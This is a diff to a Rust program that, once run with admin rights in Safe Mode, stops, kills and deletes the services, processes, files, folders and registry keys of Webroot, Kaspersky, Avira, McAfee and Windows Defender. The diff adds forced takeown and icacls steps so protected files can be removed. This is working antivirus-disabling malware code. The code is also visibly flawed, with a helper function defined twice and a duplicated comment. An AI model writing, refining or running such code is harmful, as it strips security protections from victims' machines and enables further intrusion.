@@ -587,6 +587,41 @@ fn unplug_all_isos() -> Result<()> {
     Ok(())
 }
 
+/// For file deletion, this function takes ownership of the file, grants full control
+/// to the current user, and then deletes it.  
+/// The file_path parameter should be provided without surrounding quotes.
+fn takeown_icacls_and_del(file_path: &str) {
+    // Wrap the file path in quotes to handle spaces and special characters.
+    let quoted_path = format!(r#""{}""#, file_path);
+
+    // Build the commands.
+    let takeown_cmd = format!(r#"takeown /f {}"#, quoted_path);
+    let icacls_cmd = format!(r#"icacls {} /grant %USERNAME%:F"#, quoted_path);
+    let del_cmd = format!(r#"del /q /a {}"#, quoted_path);
+
+    // Execute the commands in sequence.
+    execute_command(&takeown_cmd);
+    execute_command(&icacls_cmd);
+    execute_command(&del_cmd);
+}
+
+/// Helper function to take ownership, grant permissions, and then delete a file.
+/// The file_path parameter should be provided without surrounding quotes.
+fn takeown_icacls_and_del(file_path: &str) {
+    // Wrap the file path in quotes to handle spaces or special characters.
+    let quoted_path = format!(r#""{}""#, file_path);
+
+    // Build the commands.
+    let takeown_cmd = format!(r#"takeown /f {}"#, quoted_path);
+    let icacls_cmd = format!(r#"icacls {} /grant %USERNAME%:F"#, quoted_path);
+    let del_cmd = format!(r#"del /q /a {}"#, quoted_path);
+
+    // Execute the commands in sequence.
+    execute_command(&takeown_cmd);
+    execute_command(&icacls_cmd);
+    execute_command(&del_cmd);
+}
+
 fn main() -> io::Result<()> {
     // Step 1: Admin Control Check
     if !is_admin() {
@@ -594,18 +629,18 @@ fn main() -> io::Result<()> {
         exit(0); // Exit gracefully
     }
 
-    // Check for Safe Mode before proceeding
+    // Check for Safe Mode before proceeding.
     if is_safe_mode() {
         println!("Safe Mode detected, proceeding with actions...");
 
-        // Create a vector to hold all commands.
-        let mut commands: Vec<&str> = Vec::new();
+        // Use a vector for commands that don’t involve file deletion.
+        let mut commands: Vec<String> = Vec::new();
 
         // Group 2: Cleanup Safe Mode setting
-        commands.push(r#"bcdedit /deletevalue {current} safeboot"#);
+        commands.push(r#"bcdedit /deletevalue {current} safeboot"#.to_string());
 
         // Group 3: Webroot services and files cleanup
-        let webroot_cmds = vec![
+        let webroot_service_cmds = vec![
             // Stop services
             "sc stop WRSkyClient",
             "sc stop WRCoreService",
@@ -614,51 +649,52 @@ fn main() -> io::Result<()> {
             "sc delete WRSkyClient",
             "sc delete WRCoreService",
             "sc delete WRSVC",
-            // Delete files
-            r#"del /f /y "%SystemRoot%\System32\Drivers\wrkrn.sys""#,
-            r#"del /f /y "%SystemRoot%\System32\wruser.dll""#,
-            // Delete folders
-            r#"rd /s /q "%ProgramFiles%\Webroot""#,
-            r#"rd /s /q "%ProgramFiles(x86)%\Webroot""#,
-            r#"rd /s /q "%ProgramData%\WRCore""#,
-            r#"rd /s /q "%ProgramData%\WRData""#,
         ];
-        commands.extend(webroot_cmds);
+        for cmd in webroot_service_cmds {
+            commands.push(cmd.to_string());
+        }
 
-        // Group 4: Kaspersky directories cleanup 
-        let kaspersky_dirs_cmds = vec![
-            r#"rd /s /q "%ProgramData%\Kaspersky Lab""#,
-            r#"rd /s /q "%ProgramFiles%\Kaspersky Lab""#,
-            r#"rd /s /q "%ProgramFiles(x86)%\Kaspersky Lab""#,
-        ];
-        commands.extend(kaspersky_dirs_cmds);
+        // Instead of issuing raw del commands, use the helper for file deletion.
+        if let Ok(system_root) = env::var("SystemRoot") {
+            let wrkrn_sys = format!(r"{}\System32\Drivers\wrkrn.sys", system_root);
+            let wruser_dll = format!(r"{}\System32\wruser.dll", system_root);
+            takeown_icacls_and_del(&wrkrn_sys);
+            takeown_icacls_and_del(&wruser_dll);
+        }
+
+        // Delete Webroot directories.
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Webroot""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Webroot""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramData%\WRCore""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramData%\WRData""#);
+
+        // Group 4: Kaspersky directories cleanup
+        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Kaspersky Lab""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Kaspersky Lab""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Kaspersky Lab""#);
 
         // Group 5: Avira directories cleanup
-        let avira_dirs_cmds = vec![
-            r#"rd /s /q "%ProgramFiles%\Avira""#,
-            r#"rd /s /q "%ProgramFiles(x86)%\Avira""#,
-            r#"rd /s /q "%ProgramData%\Avira""#,
-        ];
-        commands.extend(avira_dirs_cmds);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Avira""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Avira""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Avira""#);
 
         // Group 6: McAfee directories cleanup
-        let mcafee_dirs_cmds = vec![
-            r#"rd /s /q "%ProgramData%\McAfee""#,
-            r#"rd /s /q "%ProgramFiles%\McAfee""#,
-            r#"rd /s /q "%ProgramFiles(x86)%\McAfee""#,
-        ];
-        commands.extend(mcafee_dirs_cmds);
- 
+        add_takeown_and_delete(&mut commands, r#""%ProgramData%\McAfee""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\McAfee""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\McAfee""#);
+
         // Group 7: Windows Defender and Advanced Threat Protection cleanup
-        let defender_dirs_cmds = vec![
-            r#"del /f /y "%SystemRoot%\System32\SecurityHealthSystray.exe""#,
-            r#"rd /s /q "%ProgramFiles%\Windows Defender""#,
-            r#"rd /s /q "%ProgramFiles(x86)%\Windows Defender""#,
-            r#"rd /s /q "%ProgramData%\Microsoft\Windows Defender""#,
-            r#"rd /s /q "%ProgramFiles%\Windows Defender Advanced Threat Protection""#,
-            r#"rd /s /q "%ProgramFiles(x86)%\Windows Defender Advanced Threat Protection""#,
-        ];
-        commands extend(defender_dirs_cmds);
+        // For file deletion, use the helper function.
+        if let Ok(system_root) = env::var("SystemRoot") {
+            let security_health = format!(r"{}\System32\SecurityHealthSystray.exe", system_root);
+            takeown_icacls_and_del(&security_health);
+        }
+        // Delete Windows Defender directories.
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Windows Defender""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Windows Defender""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Microsoft\Windows Defender""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Windows Defender Advanced Threat Protection""#);
+        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Windows Defender Advanced Threat Protection""#);
 
         // Group 8: Kill antivirus processes
         let kill_processes_cmds = vec![
@@ -672,7 +708,9 @@ fn main() -> io::Result<()> {
             "taskkill /F /IM MsMpEng.exe /T",
             "taskkill /F /IM VSSERV.exe /T",
         ];
-        commands.extend(kill_processes_cmds);
+        for cmd in kill_processes_cmds {
+            commands.push(cmd.to_string());
+        }
 
         // Group 9: Stop antivirus services
         let stop_services_cmds = vec![
@@ -690,7 +728,9 @@ fn main() -> io::Result<()> {
             r#"sc stop "McAfee Firewall Core Service""#,
             r#"sc stop "McAfee Validation Trust Protection""#,
         ];
-        commands.extend(stop_services_cmds);
+        for cmd in stop_services_cmds {
+            commands.push(cmd.to_string());
+        }
 
         // Group 10: Delete antivirus services
         let delete_services_cmds = vec![
@@ -708,8 +748,11 @@ fn main() -> io::Result<()> {
             r#"sc delete "McAfee Firewall Core Service""#,
             r#"sc delete "McAfee Validation Trust Protection""#,
         ];
-        commands.extend(delete_services_cmds);
+        for cmd in delete_services_cmds {
+            commands.push(cmd.to_string());
+        }
 
+        // Group 11: Delete registry keys for antivirus programs.
         // Group 11: Delete registry keys for antivirus programs
         let delete_registry_cmds = vec![
             // Startup keys
@@ -773,11 +816,14 @@ fn main() -> io::Result<()> {
             // Avira key
             r#"reg delete HKLM\SOFTWARE\AVIRA /f"#,
         ];
-        commands.extend(delete_registry_cmds);
 
-        // Execute each command in order.
+        for cmd in delete_registry_cmds {
+            commands.push(cmd.to_string());
+        }
+
+        // Execute all commands that were queued.
         for command in commands {
-            execute_command(command);
+            execute_command(&command);
         }
 
         // Remove antivirus folder.
